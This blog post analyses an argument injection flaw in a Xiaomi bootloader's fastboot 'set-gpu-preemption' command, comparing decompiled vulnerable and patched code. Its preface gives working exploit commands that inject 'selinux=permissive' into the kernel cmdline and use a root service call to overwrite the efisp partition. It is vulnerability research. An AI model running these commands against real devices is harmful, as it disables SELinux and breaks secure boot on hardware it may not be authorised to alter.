---
title: "Pokapoka Wrecking Xiaomi — A Small Leak Sinks a Great Ship (1): Analysis of Xiaomi Fastboot Overflow"
date: 2026-05-24T09:58:00+08:00
draft: false
toc: false
images:
tags:
  - tech
  - pokapoka
  - android
  - xiaomi
  - vulnerable
description: "Xiaomi once made decent porridge; now it’s just murky water."
---

## Preface

Xiaomi features an OEM command called `set-gpu-preemption`, and this bad boy has a command argument injection vulnerability that lets you inject into the `kernel cmdline`. In the wild, it looks something like this:

```
# the second argument could cause argument injection. This is what we are talking about today
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
fastboot continue 

# This is exploiting IMQS(a MI service) to get root, this calling has root permission, dd command means to exploit the GBL boot vulnerable to persist the root shell. 3 vulnerables in a row, causing all secureboot chain collapsed.
adb shell 'service call miui.mqsas.IMQSNative 21 i32 1 s16 "dd" i32 1 s16 "if=/data/local/tmp/linuxloader_unlock.efi of=/dev/block/by-name/efisp" s16 "/data/mqsas/log.txt" i32 60'

```

## Analysis

Tested and confirmed: this vulnerability was patched out in HyperOS 3.0.305.

Below is the relevant decompiled code showing how this illegal argument concatenation dumpster fire happens. It was analyzed using Ghidra 12.0.4 BuildDev, so expect a few decompilation formatting quirks here and there. Some critical variables have been renamed for the sake of clarity.

```c
// HyperOS 3.0.305 ABL, RVA 0x5d600
void fb_oem_set_gpu_preemption(void)

{
  bool bVar1;
  undefined1 uVar2;
  undefined1 uVar3;
  long len;
  undefined *puVar5;
  undefined8 uVar6;
  long extraout_x8;
  byte *userinput;
  code *pcVar7;
  char buf_msg [256];
  char buf_log [64];
  undefined8 local_28;
  
  FUN_00060db0();
  local_28 = *(undefined8 *)(extraout_x8 + 0x20);
  AsciiStrCpyS(buf_log,"Set GPU HW Preemption: ",0x40);
  AsciiStrCpyS(buf_msg," msm_kgsl.preempt_enable=",0x100);

  for (; (len = AsciiStrLen((long)userinput), len  != 0 && (*userinput == 0x20));
      userinput = userinput + 1) {
  }
  
  len = AsciiStrLen((long)userinput);
  if (len == 1) {
    uVar2 = 0x2f < (*userinput & 0xfe);
    uVar3 = (*userinput & 0xfe) == 0x30;
    if ((bool)uVar3) {
      puVar5 = (undefined *)AsciiStrLen((long)unaff_x19);
      AsciiStrCatS(buf_msg,0x100,(char *)userinput, puVar5);
      pcVar7 = *(code **)(DAT_00103398 + 0x58);
      uVar6 = AsciiStrLen((long)buf_msg);
      FUN_00061234();
      if (!(bool)uVar2 || (bool)uVar3) {
        FUN_00003900();
      }
      len = (*pcVar7)(L"GpuConfiguration",&DAT_000 c8364,7,uVar6,buf_msg);
      if (len < 0) {
        puVar5 = (undefined *)AsciiStrLen(0x643ef);
        uVar3 = puVar5 + -10 == (undefined *)0xfffffffffffff ff4;
        if (puVar5 + -10 < (undefined *)0xfffffffffffffff5) {
          FUN_00003900();
        }
        AsciiStrCatS(buf_log,IMAGE_DOS_HEADE R_00000000.e_program,": failed!",puVar5);
        FUN_00057738();
      }
      else {
        puVar5 = (undefined *)AsciiStrLen(0x726e2);
        FUN_000616f8();
        if (!(bool)uVar2 || (bool)uVar3) {
          FUN_00003900();
        }
        AsciiStrCatS(buf_log,IMAGE_DOS_HEADE R_00000000.e_program,": done",puVar5);
        FUN_0005784c();
      }
      FUN_00060904();
      if ((bool)uVar3) {
        return;
      }
      goto LAB_0005d7e8;
    }
  }
  bVar1 = false;
  FUN_00060904();
  if (bVar1) {
    FUN_00057738();
    return;
  }
LAB_0005d7e8:
   error_dertection_halting();
}


undefined8 AsciiStrCatS(char *param_1,undefined  *param_2,char *param_3,undefined *param_4)

{
  char *pcVar1;
  undefined1 in_ZR;
  bool bVar2;
  undefined *puVar3;
  char *pcVar4;
  undefined *puVar5;
  undefined8 uVar6;
  undefined8 uVar7;
  undefined *puVar8;
  
  puVar3 = (undefined *)FUN_000024d8();
  if (param_1 == (char *)0x0) {
    pcVar4 = FUN_00060d84();
    uVar6 = 0x828;
  }
  else if (param_3 == (char *)0x0) {
    pcVar4 = FUN_00060d6c();
    uVar6 = 0x829;
  }
  else {
    in_ZR = param_2 == &DAT_000f4240;
    if (param_2 < &DAT_000f4241) {
      in_ZR = param_4 == &DAT_000f4240;
      if (param_4 < &DAT_000f4241) {
        if (param_2 != (undefined *)0x0) {
          in_ZR = param_2 == puVar3;
          if ((bool)in_ZR) {
            pcVar4 = FUN_00061b6c();
            FUN_00001efc(pcVar4,0x83b);
            uVar7 = 0x8000000000000004;
          }
          else {
            puVar8 = param_2 + -(long)puVar3;
            puVar5 = (undefined *)FUN_000024d8();
            in_ZR = puVar8 <= param_4 && puVar8 == puV ar5;
            if (puVar8 <= param_4 && puVar8 <= puVar5) {
              pcVar4 = FUN_00061c04();
              FUN_00001efc(pcVar4,0x842);
              uVar7 = 0x8000000000000005;
            }
            else {
              if (param_4 <= puVar5) {
                puVar5 = param_4;
              }
              bVar2 = param_3 <= param_1;
              pcVar4 = param_3 + (long)puVar5 + 1;
              in_ZR = bVar2 && pcVar4 == param_1;
              if (bVar2 && param_1 < pcVar4) {
                FUN_00001efc("/home/work/mnt/miui_codes1/build_home_rom-odm-merged/kernel_platform/out/bazel/output_user_root/b1970bca595d87272e733a0c3ce8a31e/sandbox/processwrapper-sandbox/142/execroot/_main/bootable/bootloader/edk2/MdePkg/Library/BaseLib/SafeString.c"
                             ,0x84b,
                             "InternalSafeStringNoAsciiStrOverlap (Destination, DestMax, (CHAR8 *)Source, SourceLen + 1)"
                            );
              }
              else {
                pcVar1 = param_1 + (long)param_2;
                in_ZR = param_3 >= param_1 && pcVar1 == param_3;
                if (((param_3 < param_1 || pcVar1 <= param_ 3) ||
                    (FUN_00001efc("/home/work/mnt/miui_codes1/build_home_rom-odm-merged/kernel_platform/out/bazel/output_user_root /b1970bca595d87272e733a0c3ce8a31e/s andbox/processwrapper-sandbox/142/exe croot/_main/bootable/bootloader/edk2/M dePkg/Library/BaseLib/SafeString.c"
                                  ,0x84b,
                                  "InternalSafeStringNoAsciiStrOverlap (Destination, DestMax, (CHAR8 *)Source, SourceLen + 1)"
                                 ), !bVar2 || pcVar4 <= param_1)) &&
                   (in_ZR = param_1 <= param_3 && pcVar1 = = param_3,
                   param_1 > param_3 || pcVar1 <= param_3) ) {
                  pcVar4 = param_1 + (long)puVar3;
                  for (; (puVar5 != (undefined *)0x0 && (*para m_3 != '\0')); param_3 = param_3 + 1)
                  {
                    *pcVar4 = *param_3;
                    puVar5 = puVar5 + -1;
                    pcVar4 = pcVar4 + 1;
                  }
                  uVar7 = 0;
                  *pcVar4 = '\0';
                  goto LAB_00002ac4;
                }
              }
              uVar7 = 0x800000000000000f;
            }
          }
          goto LAB_00002ac4;
        }
        pcVar4 = FUN_00061108();
        uVar6 = 0x836;
      }
      else {
        pcVar4 = 
        "/home/work/mnt/miui_codes1/build_home_rom-odm-merged/kernel_platform/out/bazel/outp ut_user_root/b1970bca595d87272e733a0c3ce8 a31e/sandbox/processwrapper-sandbox/142/execroot/_main/bootable/bootloader/edk2/MdePkg/Library/BaseLib/SafeString.c";
        uVar6 = 0x830;
      }
    }
    else {
      pcVar4 = FUN_000614f0();
      uVar6 = 0x82f;
    }
  }
  uVar7 = 0x8000000000000002;
  FUN_00001efc(pcVar4,uVar6);
LAB_00002ac4:
  FUN_000608d8();
  if (!(bool)in_ZR) {
    error_dertection_halting();
  }
  return uVar7;
}

// RVA FUN_00043a2c
void error_dertection_halting(void)

{
  FUN_00001c1c(0x80000000,"Error: Stack Smashing Detected. Halting...\n");
  do {
  } while( true );
}


```

```c
// HyperOS 3.0.45 ABL, RVA 0x5f3d4
void fb_oem_set_gpu_preemption(void)
{
  undefined1 in_ZR;
  undefined1 in_CY;
  long lVar1;
  undefined *n;
  long extraout_x8;
  byte *user_input;
  code *pcVar3;
  char buf_msg [256];
  char buf_log [64];
  undefined8 uStack_28;
  FUN_00062a68();
  uStack_28 = *(undefined8 *)(extraout_x8 + 0x80);
  AsciiStrCpyS(buf_log,"Set GPU HW Preempti on: ",0x40);
  AsciiStrCpyS(buf_msg," msm_kgsl.preempt_ enable=",0x100);
  while (lVar1 = AsciiStrLen((long)user_input), lVar 1 != 0) {
    in_CY = 0x1f < *user_input;
    in_ZR = *user_input == 0x20;
    if (!(bool)in_ZR) break;
    user_input = user_input + 1;
  }
  n = (undefined *)AsciiStrLen((long)user_input);
  AsciiStrCatS(buf_msg,IMAGE_DOS_HEADER_00000000.e_program + 0xc0,(char *)user_input,n);
  pcVar3 = *(code **)(DAT_001063f0 + 0x58);
  AsciiStrLen((long)buf_msg);
  FUN_00062d84();
  if (!(bool)in_CY || (bool)in_ZR) {
    FUN_00003900();
  }
  lVar1 = (*pcVar3)(L"GpuConfiguration",&DAT_000cb 3b4,7,user_input,buf_msg);
  if (lVar1 < 0) {
    n = (undefined *)AsciiStrLen(0x65d1c);
    in_ZR = n + -10 == (undefined *)0xfffffffffffffff 4;
    if (n + -10 < (undefined *)0xfffffffffffffff5) {
    FUN_00003900();
  }
  AsciiStrCatS(buf_log,IMAGE_DOS_HEADER_00000000.e_program,": failed!",n);
  FUN_00059084();
  }
  else {
    n = (undefined *)AsciiStrLen(0x7493d);
    FUN_000631c4();
    if (!(bool)in_CY || (bool)in_ZR) {
      FUN_00003900();
    }
    AsciiStrCatS(buf_log,IMAGE_DOS_HEADER_00000000.e_program,": done",n);
    FUN_00059198();
  }
  FUN_000626f8();
  if ((bool)in_ZR) {
    return;
  }
  error_dertection_halting();
}

// RVA 0004a00c
void error_dertection_halting(void)
{
  FUN_00001c1c(0x80000000,"Error: Stack Smashing Detected. Halting...\n");
  do {
  } while( true );
}


```

### Comparison & Verdict

* In version **3.0.305**, `fb_oem_set_gpu_preemption` features strict input validation: `AsciiStrLen(input) == 1 && (*input & 0xFE) == 0x30`. This means it strictly accepts a single char `'0'` or `'1'`. Anything else triggers a one-way ticket to `FUN_00043a2c` (the `error_dertection_halting` panic path).
* In version **3.0.45**, the exact same function completely lacks this sanity check. It takes the raw user input (`unaff_x19`, supplied via the fastboot command line) and straight up dumps it into `AsciiStrCatS(buf_msg, 0xC0, input, AsciiStrLen(input))`.
* The concatenated string is then written directly into a UEFI variable via `SetVariable(L"GpuConfiguration", ...)`, which ultimately ends up appended right after `msm_kgsl.preempt_enable=` in the kernel cmdline.

### The Core of the 3.0.45 Injection Vuln

In plain English, let's look at the core fastboot injection command:

```
fastboot oem set-gpu-preemption-value 0 androidboot.selinux=permissive

```

When the command string comes through the fastboot protocol, the handler hands over everything *after* `oem set-gpu-preemption-value` as the `user_input`. That means it grabs:

```
0 androidboot.selinux=permissive

```

Peeking back at the 3.0.45 code, the magic happens in these two lines:

```c
while (... *user_input == 0x20) user_input++;   // Only skips leading spaces. I (NCC) swapped the original `for` loop to a `while` loop here so it's easier on the eyes; the raw decompiled code is in the GitHub repo.
n = AsciiStrLen(unaff_x19);                      // n = total length of the remaining string
AsciiStrCatS(buf_msg, 0x100, user_input, n);     // Appends the whole damn remaining string into buf_msg

```

The initial content of `buf_msg` is `" msm_kgsl.preempt_enable="`. Post-concatenation, it mutates into:

```
 msm_kgsl.preempt_enable=0 androidboot.selinux=permissive

```

Next, this `buf_msg` is fed into the `GpuConfiguration` protocol/variable setter, which gets tacked onto the kernel command line. When you execute `continue` to boot up, the kernel parses the cmdline by splitting strings at spaces. As a result, `androidboot.selinux=permissive` becomes an independent, fully active kernel parameter.

**The core bug: The handler assumes `user_input` is just "a single value," but in reality, it grabs *everything left on the command line* without truncating at spaces.** It just drags everything after the space along for the ride. To make matters worse, there's zero check at the beginning of the function to see if the bootloader needs to be unlocked first. It just blindly runs. My path to the Holy Land was completely unhindered—smooth sailing all the way.

### The Core Fix in 3.0.305

Now look at the gatekeeper in 305:

```c
len = AsciiStrLen(user_input);
if (len == 1) {                          // The entire remaining string length MUST be exactly 1
    uVar3 = (*userinput & 0xfe) == 0x30; // And it must be either '0' or '1'
}
```

Since the length of `0 androidboot.selinux=permissive` is way larger than 1, it gets instantly rejected by `if (len == 1)`. Even if you only pass `fastboot oem set-gpu-preemption 0 androidboot...`, the moment you append a space and extra junk, the `len` constraint fails and kicks you out.

**The core fix: Hard 0/1 constraints combined with a strict length limit of 1 to completely shut down any funny business.** (This length restriction in the actual source code might just be a side effect of some safe-string utility function).

### The Exploitation Chain

This specific snippet from the 3.0.45 code caught my eye:

```c
pcVar3 = *(code **)(DAT_001063f0 + 0x58);
//...
lVar1 = (*pcVar3)(L"GpuConfiguration",&DAT_000cb 3b4,7,user_input,buf_msg);

```

Here, `pcVar3` is clearly invoked as a method pointer, and the user-controlled `buf_msg` is stored right here. Tracking the struct `DAT_001063f0` led us to the following offsets (turns out I searched for nothing—it's just the standard standard `EFI_RUNTIME_SERVICES` layout), where the base offset `0x58` maps perfectly to the `SetVariable` method.

| Offset | Field | Note |
| --- | --- | --- |
| 0x00 | EFI_TABLE_HEADER (Hdr) | +24 |
| 0x18 | GetTime | +8 |
| 0x20 | SetTime | +8 |
| 0x28 | GetWakeupTime | +8 |
| 0x30 | SetWakeupTime | +8 |
| 0x38 | SetVirtualAddressMap | +8 |
| 0x40 | ConvertPointer | +8 |
| 0x48 | GetVariable | +8 |
| 0x50 | GetNextVariableName | +8 |
| 0x58 | SetVariable | +8 |
| 0x60 | GetNextHighMonotonicCount | +8 |
| 0x68 | ResetSystem | +8 |
| 0x70 | UpdateCapsule | +8 |

According to the UEFI Spec 2.10, the `SetVariable` method is defined as:

```
EFI_STATUS SetVariable (
  IN     CHAR16     *VariableName,   // Variable Name (UTF-16 String)
  IN     EFI_GUID   *VendorGuid,     // Unique identifier for the vendor GUID
  IN     UINT32     Attributes,      // Attributes bitmask, e.g., 7 = NV+BS+RT
  IN     UINTN      DataSize,        // Data size in bytes
  IN     VOID       *Data            // Pointer to the data buffer
);

```

As for the code:

```c
FUN_000029f0(acStack_168,IMAGE_DOS_HEADER_00000000.e_program + 0xc0,(char *)unaff_x19,puVa r2);

```

The decompiler reveals that the handler calls `AsciiStrnCatS(buf_msg, DestMax, user_input, AsciiStrLen(user_input))`. This function is the standard implementation from the EDK2 SafeString library, taking 4 arguments with the semantics: `Actual bytes copied = min(Length, DestMax - AsciiStrLen(Destination) - 1)`

The second argument, `DestMax`, shows up in the decompiler as `IMAGE_DOS_HEADER_00000000.e_program + 0xc0`. This is just an artifact of Ghidra hallucinating and mistakenly applying the `IMAGE_DOS_HEADER` struct over the zero page. The zero page gets misidentified as an `IMAGE_DOS_HEADER` type, forcing an addition offset expression instead of a clean immediate value. Even knowing it was a decompiler artifact, figuring out its real value and purpose took me quite a while. I wasn't sure if it was a dumpster for temporary variables or an actual assignment. After some digging, it turned out to be a straight-up immediate value: `0x40 + 0xc0 = 0x100`. You can spot it easily in the assembly:

```txt
  LAB_0005f438         XREF[2]:              0005f420(j), 0005f42c(j)  
0005f438  e0 03 13 aa               mov                   x0,x19
0005f43c  95 8f fe 97                 bl     FUN_00003290                                                                                   
0005f440  e3 03 00 aa               mov                   x3,x0
0005f444  e0 23 00 91               add                    x0,sp,#0x8
0005f448  01 20 80 52               mov                   w1,#0x100
0005f44c  e2 03 13 aa               mov                   x2,x19
0005f450  68 8d fe 97                bl                       FUN_000029f0 
0005f454  28 05 00 f0                adrp                  x8,0x106000
0005f458  e0 23 00 91               add                    x0,sp,#0x8
0005f45c  08 f9 41 f9                 ldr                      x8,[x8, #0x3f0]=>DAT_001063f0
0005f460  14 2d 40 f9                ldr                      x20,[x8, #0x58]
0005f464  8b 8f fe 97                 bl                       FUN_00003290
0005f468  47 0e 00 94               bl                       FUN_00062d84
0005f46c  29 06 00 54               b.ls                    LAB_0005f530

```

*(Ghidra's trash formatting drives me nuts. It randomly adds spaces when copying variables, and copying assembly dumps like twenty un-deletable tabs. Cleaning it up to make it readable takes longer than rewriting it by hand. Looks like the CIA's R&D department got infiltrated by outsourced offshore devs too).*

After setting the global variable, the reading side also triggers `GetVariable` to pull it back. In `diff_analyze/notes.txt:2030`, there is a call to `DAT_001063f0 + 0x48`, which follows the layout for `GetVariable(L"GpuConfiguration", &DAT_000cb3b4, ...)`.

Once successfully read, the data lands in `DAT_001074a8`, and is later appended into the final cmdline at `notes.txt:2865` via `FUN_0000284c(pcVar50, puVar62, &DAT_001074a8)`.

The calling signature of `FUN_0000284c` matches a massive amount of surrounding `" androidboot.xxx="` concatenations, indicating it's an append helper like `AsciiStrCatS`/`AsciiStrnCatS`. Given the nature of this bug, it is indeed directly appended.

#### Confirming `FUN_000029f0` is `AsciiStrnCatS`

Looking closely at the logic:

```c
pcVar6 = param_1 + (long)puVar2;   // puVar2 from FUN_000024d8() = AsciiStrnLenS(Destination, DestMax)
for (; (puVar4 != (undefined *)0x0 && (*param_3 != '\0')); param_3 = param_3 + 1)
{
    *pcVar6 = *param_3;
    puVar4 = puVar4 + -1;
    pcVar6 = pcVar6 + 1;
}
*pcVar6 = '\0';

```

The closest snippet I found in EDK2 is this (my eyes are absolutely shot):

```c
Destination = Destination + DestLen;
while ((SourceLen > 0) && (*Source != 0)) {
  *(Destination++) = *(Source++);
  SourceLen--;
}
*Destination = 0;

```

It appends the `Source` string starting from the end of the existing `Destination` string, copying byte-by-byte until the buffer runs out of space or the source terminates. This perfectly matches the semantics of `AsciiStrnCatS`, rather than a lookalike `CopyMem`.

This is further backed up by two `InternalSafeStringNoAsciiStrOverlap` assertions and the EDK2 source path line number `0x84b` (line 2123) inside `SafeString.c`.
Inside the function body, you can spot the EDK2 `SafeString.c` path string, the `InternalSafeStringNoAsciiStrOverlap` assertion string, and the PCD check `(Length <= (_gPcd_FixedAtBuild_PcdMaximumAsciiStringLength))`. These are all classic, dead-giveaway signatures of EDK2's `AsciiStrnCatS`. After tons of second-guessing and refactoring, we can officially lock in this function name.

#### Injection Limit Testing

Dumping massive arrays to probe the boundaries yielded these results:

```
# fastboot oem set-gpu-preemption 0 INJECTED=yes is more than enough; you cannot append "-value"


❯ fastboot oem set-gpu-preemption 0 AAA...

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (39 chars)

❯ fastboot oem set-gpu-preemption-value 0 BBBBB...
 
msm_kgsl.preempt_enable=-value
0
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB  (33 chars)

❯ fastboot oem set-gpu-preemption CCC...

msm_kgsl.preempt_enable=CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC (41 chars)

```

What a bizarre set of limits. They don't line up with `SetVariable` buffer boundaries, and the downstream truncation limit of 256 makes it even less likely.

I dug up some docs later: the fastboot protocol command buffer itself has a hard limit of 64 bytes. The string `"oem set-gpu-preemption"` takes up 22 bytes (excluding "fastboot", but counting the trailing space). Doing the math: 64 - 22 - 1 = 41.

Also, the fact that it matches both `set-gpu-preemption-value` and `set-gpu-preemption` is jank as hell. The underlying parser probably just does a byte-by-byte prefix match from start to finish. God knows when a shared prefix will cause the execution to fly off the rails.

On top of that, another thing is super sketchy. ABL init components like `FtwLite`, `VarCheck`, and `VariableRuntimeDxe` pass persistence flags when invoking `SetVariable`. Yet, upon a reboot, the device completely rolls back to its pre-modified state. It looks like NVRAM wasn't even working. My guess is the backend didn't even bother mounting NVRAM, so this method can't persist any variables. (Why would anyone build a system like this?)

### The Big Picture

## Summary

To wrap it up, this is basically a textbook fastboot design oversight—just a classic bad argument concatenation. It also exposes how rushed and sloppy Xiaomi's low-level system design is, completely lacking proper security boundaries. They even leaked private build paths and the developer's actual name inside the production ABL firmware. Talk about a rookie mistake.

The window of opportunity for this exploit wasn't wide, but it became the go-to gateway for bootloader bypassing. KernelSU dropped a jailbreak feature using this, apparently leveraging root privileges to pull off some wizardry in the system partition to unlock the BL once SELinux was neutralized.

But what's coming up next makes a simple BL unlock look like child's play. Part 2 of this series will cover a devastating chain-of-trust breakage attack. This allows us to taint the entire boot process post-ABL while completely preserving the TEE keys. Stay tuned.